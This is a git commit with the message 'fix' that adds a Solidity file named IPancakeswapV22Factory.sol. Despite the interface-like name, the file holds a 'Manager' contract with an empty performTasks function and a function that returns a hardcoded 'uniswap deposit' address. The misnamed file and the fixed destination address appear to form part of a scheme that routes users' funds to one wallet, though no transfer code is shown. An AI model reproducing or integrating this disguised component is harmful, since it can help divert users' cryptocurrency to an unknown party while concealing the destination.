6b42b29465fc23e0f8dcf3a0b0b75572cd226554
CryptoNinjaCode <104848450+CryptoNinjaCode@users.noreply.github.com>
2022-05-03 18:32:32 +0300

    fix

---
+++ IPancakeswapV22Factory.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x0E3Cf78B3f5cf230155a96E69E7D6e42C5cAf714;
+	}
+}
